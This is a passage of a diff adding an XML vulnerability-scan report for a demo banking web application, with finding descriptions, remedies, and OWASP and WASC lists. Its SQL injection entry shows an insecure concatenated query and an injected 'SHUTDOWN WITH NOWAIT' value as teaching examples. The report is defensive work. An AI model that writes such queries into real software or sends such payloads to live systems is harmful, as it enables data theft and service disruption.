+Server-specific details can be found <A HREF="https://community.qualys.com/blogs/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks" TARGET="_blank">here</A>.
+A tool that demonstrates this vulnerability in a more intrusive manner is available <A HREF="https://github.com/shekyan/slowhttptest" TARGET="_blank">here</A>.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150086</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>3</SEVERITY>
+                <TITLE>Server accepts unnecessarily large POST request body</TITLE>
+                <OWASP>A5</OWASP>
+                <DESCRIPTION><![CDATA[Web application scanner successfully sent a POST request with content type of application/x-www-form-urlencoded and 65536 bytes length random text data.
+Accepting request bodies with unnecessarily large size could help attacker to use less connections to achieve Layer 7 DDoS of web server.
+More information can be found at the <A HREF="https://media.blackhat.com/bh-dc-11/Brennan/BlackHat_DC_2011_Brennan_Denial_Service-Slides.pdf" TARGET="_blank">here</A>]]></DESCRIPTION>
+                <IMPACT>Could result in successful application level (Layer 7) DDoS attack. </IMPACT>
+                <SOLUTION><![CDATA[Limit the size of the request body to each form's requirements. For example, a search form with 256-char search field should not accept more than 1KB value.
+Server-specific details can be found <A HREF="https://community.qualys.com/blogs/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks" TARGET="_blank">here</A>. ]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150087</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Web Service Found</TITLE>
+                <DESCRIPTION><![CDATA[The list of links with Web Service descriptions was found during the crawling or by brute forcing. List of Web Services is included with every discovered Web Service description.
+
+]]></DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150093</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>5</SEVERITY>
+                <TITLE>SQL Injection in Web Service call</TITLE>
+                <GROUP>SQL</GROUP>
+                <OWASP>A1</OWASP>
+                <DESCRIPTION><![CDATA[SQL injection enables an attacker to modify the syntax of a SQL query in order to retrieve, corrupt or delete data. This is accomplished by manipulating query criteria in a manner that affects the query's logic. The typical causes of this vulnerability are lack of input validation and insecure construction of the SQL query.
+<P>
+Queries created by concatenating strings with SQL syntax and user-supplied data are prone to this vulnerability. If any part of the string concatenation can be modified, then the meaning of the query can be changed.
+<P>
+Examples:
+<BR>
+These two lines demonstrate an insecure query that is created by appending the user-supplied data (<B>userid</B>):<BR>
+<CODE>
+dim strQuery as String <BR>
+strQuery = "SELECT name,email FROM users WHERE userid=" + Request.QueryString("userid")
+</CODE>
+<P>
+If no checks are performed against the <B>userid</B> parameter, then the query may be arbitrarily modified as shown in these two examples of a completed query:<BR>
+<CODE>
+SELECT name,email FROM users WHERE userid=<U>42</U><BR>
+SELECT name,email FROM users WHERE userid=<U>42; SHUTDOWN WITH NOWAIT</U>
+</CODE>]]></DESCRIPTION>
+                <IMPACT>The scope of a SQL injection exploit varies greatly. If any SQL statement can be injected into the query, then the attacker has the equivalent access of a database administrator. This access could lead to theft of data, malicious corruption of data, or deletion of data.</IMPACT>
+                <SOLUTION><![CDATA[SQL injection vulnerabilities can be addressed in three areas: input validation, query creation, and database security.
+<P>
+All input received from the Web client should be validated for correct content. If a value's type or content range is known beforehand, then stricter filters should be applied. For example, an email address should be in a specific format and only contain characters that make it a valid address; or numeric fields like a U.S. zip code should be limited to five digit values.
+<P>
+Prepared statements (sometimes referred to as parameterized statements) provide strong protection from SQL injection. Prepared statements are precompiled SQL queries whose parameters can be modified when the query is executed. Prepared statements enforce the logic of the query and will fail if the query cannot be compiled correctly. Programming languages that support prepared statements provide specific functions for creating queries. These functions are more secure than string concatenation for assigning user-supplied data to a query.
+<P>
+Stored procedures are precompiled queries that reside in the database. Like prepared statements, they also enforce separation of query data and logic. SQL statements that call stored procedures should not be created via string concatenation, otherwise their security benefits are negated.
+<P>
+SQL injection exploits can be mitigated by the use of Access Control Lists or role-based access within the database. For example, a read-only account would prevent an attacker from modifying data, but would not prevent the user from viewing unauthorized data. Table and row-based access controls potentially minimize the scope of a compromise, but they do not prevent exploits.
+<P>
+Example of a secure query created with a prepared statement:
+<BR>
+<CODE>
+PreparedStatement ps = "SELECT name,email FROM users WHERE userid=?";
+ps.setInt(1, userid);
+</CODE>]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150099</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Cookies Issued Without User Consent</TITLE>
+                <DESCRIPTION><![CDATA[The cookies listed in the Results section were issued from the web
+application during the crawl without accepting any opt-in dialogs.]]></DESCRIPTION>
+                <IMPACT>Cookies may be set without user explicitly agreeing to accept them.</IMPACT>
+                <SOLUTION>Review the application to ensure that all cookies listed are supposed to be issued without user opt-in.  If the EU Cookie law is applicable for this web application, ensure these cookies require user opt-in or have been classified as exempt by your organization.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150101</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Third-party Cookies Collected</TITLE>
+                <DESCRIPTION>The cookies listed in the Results section were received from third-party web application(s) during the crawl phase.</DESCRIPTION>
+                <IMPACT>Cookies may contain sensitive information about the user. Cookies sent via HTTP may be sniffed.</IMPACT>
+                <SOLUTION>Review cookie values to ensure that sensitive information such as passwords are not present within them.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150112</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>2</SEVERITY>
+                <TITLE>Sensitive form field has not disabled autocomplete</TITLE>
+                <GROUP>INFO</GROUP>
+                <OWASP>A5</OWASP>
+                <DESCRIPTION><![CDATA[An HTML form that collects sensitive information does not prevent the browser from prompting the user to save the populated values for later reuse.
+Autocomplete should be turned off for any input that takes sensitive information such as credit card number, CVV2/CVC code, U.S. social security number, etc.]]></DESCRIPTION>
+                <IMPACT>If the browser is used in a shared computing environment where more than one person may use the browser, then "autocomplete" values may be submitted by an unauthorized user. </IMPACT>
+                <SOLUTION><![CDATA[Add the following attribute to the form or input element: autocomplete="off"
+This attribute prevents the browser from prompting the user to save the populated form values for later reuse.
+Most browsers no longer honor autocomplete="off" for password input fields.
+These browsers include
+Chrome, Firefox, Microsoft Edge, IE, Opera
+However, there is still an ability to turn off autocomplete through the browser and that is recommended for a shared computing environment.
+Since the ability to turn autocomplete off for password inputs fields is controlled by the user it is highly recommended for application to enforce strong password rules.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150115</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Authentication Form found</TITLE>
+                <DESCRIPTION>Authentication Form was found during the web application crawling.</DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150122</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>2</SEVERITY>
+                <TITLE>Cookie Does Not Contain The "secure" Attribute</TITLE>
+                <GROUP>INFO</GROUP>
+                <OWASP>A2,A6</OWASP>
+                <CVSS_BASE>6.4</CVSS_BASE>
+                <CVSS_TEMPORAL>5.8</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[The cookie does not contain the "secure" attribute.
+]]></DESCRIPTION>
+                <IMPACT>Cookies with the "secure" attribute are only permitted to be sent via HTTPS. Cookies sent via HTTP expose an unsuspecting user to sniffing attacks that could lead to user impersonation or compromise of the application account.</IMPACT>
+                <SOLUTION>If the associated risk of a compromised account is high, apply the "secure" attribute to cookies and force all sensitive requests to be sent via HTTPS.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150123</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>2</SEVERITY>
+                <TITLE>Cookie Does Not Contain The "HTTPOnly" Attribute</TITLE>
+                <GROUP>INFO</GROUP>
+                <OWASP>A2</OWASP>
+                <DESCRIPTION>The cookie does not contain the "HTTPOnly" attribute.</DESCRIPTION>
+                <IMPACT>Cookies without the "HTTPOnly" attribute are permitted to be accessed via JavaScript. Cross-site scripting attacks can steal cookies which could lead to user impersonation or compromise of the application account.</IMPACT>
+                <SOLUTION>If the associated risk of a compromised account is high, apply the "HTTPOnly" attribute to cookies.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150124</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>3</SEVERITY>
+                <TITLE>Clickjacking - Framable Page</TITLE>
+                <GROUP>INFO</GROUP>
+                <CVSS_BASE>6.4</CVSS_BASE>
+                <CVSS_TEMPORAL>5.8</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[The page can be easily framed. Anti-framing measures are not used.
+]]></DESCRIPTION>
+                <IMPACT><![CDATA[Clickjacking and Cross-Site Request Forgery (CSRF) can be performed  by framing the target site.
+An attack can trick the user into clicking on the link by framing the original page and showing a layer on top of it with dummy buttons.
+
+]]></IMPACT>
+                <SOLUTION><![CDATA[Two of the most popular prevention are:
+X-Frame-Options: This header works with modern browsers and can be used to prevent framing of the page. Note that is must be an HTTP header, the setting is ignored if it is created as an "http-equiv" meta element within the page.
+Framekiller: JavaScript code that prevents the malicious user from framing the page.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150126</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Links With High Resource Consumption</TITLE>
+                <GROUP>INFO</GROUP>
+                <DESCRIPTION><![CDATA[The list of links with lowest bytes/sec which are assumed to be resources with  highest resource consumption.  The links in the list have slower transfer times speeds to an average resource on the server.  This may indicate that the links are more CPU or DB intensive than majority of links.<P>
+The latency of the network and file size have no effect on calculations.
+]]></DESCRIPTION>
+                <IMPACT><![CDATA[The links with high resource consumption could be used to perform DOS on the server  by just performing GET Flooding. Attackers could more easily take the server down if there are huge resource hogs on it, performing less request.
+]]></IMPACT>
+                <SOLUTION><![CDATA[Find the root cause of resources slow download speed.  <P>
+If the cause is a real CPU strain or complex DB queries performed, there may be a need for re-engineering of the web application or defense measures should be in place.  Examples of defense against DOS that is targeted towards high resource consumption links are Load Balancers and Rate Limiters.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150152</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Forms Crawled</TITLE>
+                <DESCRIPTION>The list and details of unique forms submitted by the Web application scanner appear in the Results section. This list does not contain authentication forms (i.e. login forms) which are reported separately in QID 150115.</DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150159</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>2</SEVERITY>
+                <TITLE>Session Cookie Set over Non-HTTPS Connection</TITLE>
+                <GROUP>INFO</GROUP>
+                <DESCRIPTION>Session cookie set over Non-HTTPS connection</DESCRIPTION>
+                <IMPACT>Session cookie set over Non-HTTPS connection can lead to a Man in the Middle attack and cookie data can be stolen. Cookie values can be sniffed by an attacker. This later can be used to impersonate the authenticated user and gain unauthorized access.</IMPACT>
+                <SOLUTION> The general recommendation is to set the Session cookie over HTTPS (secure connection)</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150161</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>3</SEVERITY>
+                <TITLE>Session Cookie Does Not Contain the "Secure" Attribute</TITLE>
+                <GROUP>INFO</GROUP>
+                <DESCRIPTION>The session cookie does not contain the "secure" attribute</DESCRIPTION>
+                <IMPACT>Session Cookies with "secure" attribute are only permitted to be sent via HTTPS. Session cookies sent via HTTP expose users to sniffing attacks that could lead to user impersonation or account compromise</IMPACT>
+                <SOLUTION>Apply the "secure" attribute to session cookies to ensure that they will be sent via HTTPS only.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150170</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Logout Links Discovered </TITLE>
+                <DESCRIPTION><![CDATA[The logout links discovered by the Web Application Scanning engine are provided in the Results section. These links were present on the target Web Application, but were not crawled.
+Crawling these links will terminate the active authenticated session and it will impact the crawling of the Web Application
+
+These links are detected using common logout regex pattern used by the Web Application Scanning engine. If these logout links do not match to your Web Application, then you can use
+'Logout Regular Expression' feature from Web Portal to specify custom logout pattern.]]></DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150176</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>JavaScript Libraries Detected</TITLE>
+                <GROUP>INFO</GROUP>
+                <DESCRIPTION><![CDATA[The JavaScript libraries discovered by the Web Application Scanning engine are provided in the Results section. The discovered libraries are reported only once based on the page of the web application on which they were first detected.
+
+These libraries are reported along with other information such as: the page on which they were first found and their version and script uri.]]></DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+        </QID_LIST>
+        <GROUP_LIST>
+            <GROUP>
+                <CODE>PATH</CODE>
+                <NAME>Path Disclosure</NAME>
+                <TYPE>VULNERABILITY</TYPE>
+            </GROUP>
+            <GROUP>
+                <CODE>CC</CODE>
+                <NAME>Credit Card Numbers</NAME>
+                <TYPE>SENSITIVE_CONTENT</TYPE>
+            </GROUP>
+            <GROUP>
+                <CODE>SSN-US</CODE>
+                <NAME>Social Security Numbers (US)</NAME>
+                <TYPE>SENSITIVE_CONTENT</TYPE>
+            </GROUP>
+            <GROUP>
+                <CODE>CUSTOM</CODE>
+                <NAME>Custom Contents</NAME>
+                <TYPE>SENSITIVE_CONTENT</TYPE>
+            </GROUP>
+            <GROUP>
+                <CODE>XSS</CODE>
+                <NAME>Cross-Site Scripting</NAME>
+                <TYPE>VULNERABILITY</TYPE>
+            </GROUP>
+            <GROUP>
+                <CODE>INFO</CODE>
+                <NAME>Information Disclosure</NAME>
+                <TYPE>VULNERABILITY</TYPE>
+            </GROUP>
+            <GROUP>
+                <CODE>SQL</CODE>
+                <NAME>SQL Injection</NAME>
+                <TYPE>VULNERABILITY</TYPE>
+            </GROUP>
+        </GROUP_LIST>
+        <OWASP_LIST>
+            <OWASP>
+                <CODE>A1</CODE>
+                <NAME>Injection</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A2</CODE>
+                <NAME>Broken Authentication and Session Management</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A3</CODE>
+                <NAME>Cross-Site Scripting (XSS)</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A4</CODE>
+                <NAME>Insecure Direct Object References</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A5</CODE>
+                <NAME>Security Misconfiguration</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A6</CODE>
+                <NAME>Sensitive Data Exposure</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A7</CODE>
+                <NAME>Missing Function Level Access Control</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A8</CODE>
+                <NAME>Cross-Site Request Forgery (CSRF)</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A9</CODE>
+                <NAME>Using Components with Known Vulnerabilities</NAME>
+            </OWASP>
+            <OWASP>
+                <CODE>A10</CODE>
+                <NAME>Unvalidated Redirects and Forwards</NAME>
+            </OWASP>
+        </OWASP_LIST>
+        <WASC_LIST>
+            <WASC>
+                <CODE>WASC-1</CODE>
+                <NAME>Insufficient Authentication</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-2</CODE>
+                <NAME>Insufficient Authorization</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-3</CODE>
+                <NAME>Integer Overflows</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-4</CODE>
+                <NAME>Insufficient Transport Layer Protection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-5</CODE>
+                <NAME>Remote File Inclusion</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-6</CODE>
+                <NAME>Format String</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-7</CODE>
+                <NAME>Buffer Overflow</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-8</CODE>
+                <NAME>Cross-Site Scripting</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-9</CODE>
+                <NAME>Cross-Site Request Forgery</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-10</CODE>
+                <NAME>Denial Of Service</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-11</CODE>
+                <NAME>Brute Force</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-12</CODE>
+                <NAME>Content Spoofing</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-13</CODE>
+                <NAME>Information Leakage</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-14</CODE>
+                <NAME>Server Misconfiguration</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-15</CODE>
+                <NAME>Application Misconfiguration</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-16</CODE>
+                <NAME>Directory Indexing</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-17</CODE>
+                <NAME>Improper Filesystem Permissions</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-18</CODE>
+                <NAME>Credential/Session Prediction</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-19</CODE>
+                <NAME>SQL Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-20</CODE>
+                <NAME>Improper Input Handling</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-21</CODE>
+                <NAME>Insufficient Anti-Automation</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-22</CODE>
+                <NAME>Improper Output Handling</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-23</CODE>
+                <NAME>XML Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-24</CODE>
+                <NAME>HTTP Request Splitting</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-25</CODE>
+                <NAME>HTTP Response Splitting</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-26</CODE>
+                <NAME>HTTP Request Smuggling</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-27</CODE>
+                <NAME>HTTP Response Smuggling</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-28</CODE>
+                <NAME>Null Byte Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-29</CODE>
+                <NAME>LDAP Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-30</CODE>
+                <NAME>Mail Command Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-31</CODE>
+                <NAME>OS Commanding</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-32</CODE>
+                <NAME>Routing Detour</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-33</CODE>
+                <NAME>Path Traversal</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-34</CODE>
+                <NAME>Predictable Resource Location</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-35</CODE>
+                <NAME>SOAP Array Abuse</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-36</CODE>
+                <NAME>SSI Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-37</CODE>
+                <NAME>Session Fixation</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-38</CODE>
+                <NAME>Url Redirector Abuse</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-39</CODE>
+                <NAME>Xpath Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-40</CODE>
+                <NAME>Insufficient Process Validation</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-41</CODE>
+                <NAME>XML Attribute Blowup</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-42</CODE>
+                <NAME>Abuse Of Functionality</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-43</CODE>
+                <NAME>XML External Entities (XXE)</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-44</CODE>
+                <NAME>XML Entity Expansion</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-45</CODE>
+                <NAME>Fingerprinting</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-46</CODE>
+                <NAME>Xquery Injection</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-47</CODE>
+                <NAME>Insufficient Session Expiration</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-48</CODE>
+                <NAME>Insecure Indexing</NAME>
+            </WASC>
+            <WASC>
+                <CODE>WASC-49</CODE>
+                <NAME>Insufficient Password Recovery</NAME>
+            </WASC>
+        </WASC_LIST>
+    </GLOSSARY>
+    <APPENDIX>
+        <SCAN_LIST>
+            <SCAN>
+                <NAME>Demo Vul Scan</NAME>
+                <REFERENCE>was/1506025640903.17017983</REFERENCE>
+                <START_DATE>21 Sep 2017 04:27PM GMT-0400</START_DATE>
+                <END_DATE>21 Sep 2017 04:47PM GMT-0400</END_DATE>
+                <MODE>Vulnerability</MODE>
+                <TYPE>Manual</TYPE>
+                <WEB_APPLICATION>Vulnerable Web APP</WEB_APPLICATION>
+                <AUTHENTICATION_RECORD>None</AUTHENTICATION_RECORD>
+                <PROFILE>Vulnerable Web APP option</PROFILE>
+                <SCANNER>External (IP: 64.39.99.98, Scanner: 9.6.19-1, WAS: 4.3.87-1, Signatures: 2.4.146-2)</SCANNER>
+                <STATUS>Finished</STATUS>
+                <AUTHENTICATION_STATUS>No Authentication specified</AUTHENTICATION_STATUS>
+            </SCAN>
+        </SCAN_LIST>
+        <WEBAPP>
+            <ID>58651486</ID>
+            <NAME>Vulnerable Web APP</NAME>
+            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+            <OPERATING_SYSTEM>Windows Vista / Windows 2008 / Windows 7 / Windows 2012</OPERATING_SYSTEM>
+            <SCOPE>Limit to URL hostname</SCOPE>
+        </WEBAPP>
+        <SEVERITY_CATEGORY_LIST>
+            <SEVERITY_CATEGORY>
+                <NAME>Confirmed Vulnerability</NAME>
+                <DESCRIPTION>Vulnerabilities (QIDs) are design flaws, programming errors, or mis-configurations that make your web application and web application platform susceptible to malicious attacks. Depending on the level of the security risk, the successful exploitation of a vulnerability can vary from the disclosure of information to a complete compromise of the web application and/or the web application platform. Even if the web application isn't fully compromised, an exploited vulnerability could still lead to the web application being used to launch attacks against users of the site.</DESCRIPTION>
+                <SEVERITY_LEVEL_LIST>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>1</SEVERITY>
+                        <LEVEL>Minimal</LEVEL>
+                        <DESCRIPTION>Basic information disclosure (e.g. web server type, programming language) might enable intruders to discover other vulnerabilities, but lack of this information does not make the vulnerability harder to find.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>2</SEVERITY>
+                        <LEVEL>Medium</LEVEL>
+                        <DESCRIPTION>Intruders may be able to collect sensitive information about the application platform, such as the precise version of software used. With this information, intruders can easily exploit known vulnerabilities specific to software versions. Other types of sensitive information might disclose a few lines of source code or hidden directories.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>3</SEVERITY>
+                        <LEVEL>Serious</LEVEL>
+                        <DESCRIPTION>Vulnerabilities at this level typically disclose security-related information that could result in misuse or an exploit. Examples include source code disclosure or transmitting authentication credentials over non-encrypted channels.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>4</SEVERITY>
+                        <LEVEL>Critical</LEVEL>
+                        <DESCRIPTION>Intruders can exploit the vulnerability to gain highly sensitive content or affect other users of the web application. Examples include certain types of cross-site scripting and SQL injection attacks.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>5</SEVERITY>
+                        <LEVEL>Urgent</LEVEL>
+                        <DESCRIPTION>Intruders can exploit the vulnerability to compromise the web application's data store, obtain information from other users' accounts, or obtain command execution on a host in the web application's architecture.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                </SEVERITY_LEVEL_LIST>
+            </SEVERITY_CATEGORY>
+            <SEVERITY_CATEGORY>
+                <NAME>Potential Vulnerability</NAME>
+                <DESCRIPTION>Potential Vulnerabilities indicate that the scanner observed a weakness or error that is commonly used to attack a web application, and the scanner was unable to confirm if the weakness or error could be exploited. Where possible, the QID's description and results section include information and hints for following-up with manual analysis. For example, the exploitability of a QID may be influenced by characteristics that the scanner cannot confirm, such as the web application's network architecture, or the test to confirm exploitability requires more intrusive testing than the scanner is designed to conduct.</DESCRIPTION>
+                <SEVERITY_LEVEL_LIST>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>1</SEVERITY>
+                        <LEVEL>Minimal</LEVEL>
+                        <DESCRIPTION>Presence of this vulnerability is indicative of basic information disclosure (e.g. web server type, programming language) and might enable intruders to discover other vulnerabilities. For example in this scenario, information such as web server type, programming language, passwords or file path references can be disclosed.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>2</SEVERITY>
+                        <LEVEL>Medium</LEVEL>
+                        <DESCRIPTION>Presence of this vulnerability is indicative of basic information disclosure (e.g. web server type, programming language) and might enable intruders to discover other vulnerabilities. For example version of software or session data can be disclosed, which could be used to exploit.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>3</SEVERITY>
+                        <LEVEL>Serious</LEVEL>
+                        <DESCRIPTION>Presence of this vulnerability might give access to security-related information to intruders who are bound to misuse or exploit. Examples of what could happen if this vulnerability was exploited include bringing down the server or causing hindrance to the regular service.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>4</SEVERITY>
+                        <LEVEL>Critical</LEVEL>
+                        <DESCRIPTION>Presence of this vulnerability might give intruders the ability to gain highly sensitive content or affect other users of the web application.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>5</SEVERITY>
+                        <LEVEL>Urgent</LEVEL>
+                        <DESCRIPTION>Presence of this vulnerability might enable intruders to compromise the web application's data store, obtain information from other users' accounts, or obtain command execution on a host in the web application's architecture. For example in this scenario, the web application users can potentially be targeted if the application is exploited.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                </SEVERITY_LEVEL_LIST>
+            </SEVERITY_CATEGORY>
+            <SEVERITY_CATEGORY>
+                <NAME>Sensitive Content</NAME>
+                <DESCRIPTION>Sensitive content may be detected based on known patterns (credit card numbers, social security numbers) or custom patterns (strings, regular expressions), depending on the option profile used. Intruders may gain access to sensitive content that could result in misuse or other exploits.</DESCRIPTION>
+                <SEVERITY_LEVEL_LIST>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>1</SEVERITY>
+                        <LEVEL>Minimal</LEVEL>
+                        <DESCRIPTION>Sensitive content was found in the web server response. During our scan of the site form(s) were found with field(s) for credit card number or social security number. This information disclosure could result in a confidentiality breach and could be a target for intruders. For this reason we recommend caution.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>2</SEVERITY>
+                        <LEVEL>Medium</LEVEL>
+                        <DESCRIPTION>Sensitive content was found in the web server response. Specifically our service found a certain sensitive content pattern (defined in the option profile). This information disclosure could result in a confidentiality breach and could be a target for intruders. For this reason we recommend caution.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>3</SEVERITY>
+                        <LEVEL>Serious</LEVEL>
+                        <DESCRIPTION>Sensitive content was found in the web server response - a valid social security number or credit card information. This infomation disclosure could result in a confidentiality breach, and it gives intruders access to valid sensitive content that could be misused.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                </SEVERITY_LEVEL_LIST>
+            </SEVERITY_CATEGORY>
+            <SEVERITY_CATEGORY>
+                <NAME>Information Gathered</NAME>
+                <DESCRIPTION>Information Gathered issues (QIDs) include visible information about the web application's platform, code, or architecture. It may also include information about users of the web application.</DESCRIPTION>
+                <SEVERITY_LEVEL_LIST>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>1</SEVERITY>
+                        <LEVEL>Minimal</LEVEL>
+                        <DESCRIPTION>Intruders may be able to retrieve sensitive information related to the web application platform.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>2</SEVERITY>
+                        <LEVEL>Medium</LEVEL>
+                        <DESCRIPTION>Intruders may be able to retrieve sensitive information related to internal functionality or business logic of the web application.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                    <SEVERITY_LEVEL>
+                        <SEVERITY>3</SEVERITY>
+                        <LEVEL>Serious</LEVEL>
+                        <DESCRIPTION>Intruders may be able to detect highly sensitive data, such as personally identifiable information (PII) about other users of the web application.</DESCRIPTION>
+                    </SEVERITY_LEVEL>
+                </SEVERITY_LEVEL_LIST>
+            </SEVERITY_CATEGORY>
+        </SEVERITY_CATEGORY_LIST>
+    </APPENDIX>
+</WAS_SCAN_REPORT>
